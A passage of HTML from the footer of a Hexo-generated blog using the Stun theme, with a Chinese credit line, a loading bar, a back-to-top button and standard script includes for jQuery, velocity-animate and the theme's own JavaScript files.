target="_blank" rel="noopener">Hexo</a> 强力驱动</span><span> v5.4.0</span><span class="footer__devider">|</span><span>主题 - <a href="https://github.com/liuyib/hexo-theme-stun/" title="Stun" target="_blank" rel="noopener">Stun</a></span><span> v2.1.1</span></div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script src="/js/utils.js?v=2.1.1"></script><script src="/js/stun-boot.js?v=2.1.1"></script><script src="/js/scroll.js?v=2.1.1"></script><script src="/js/header.js?v=2.1.1"></script><script src="/js/sidebar.js?v=2.1.1"></script></body></html>
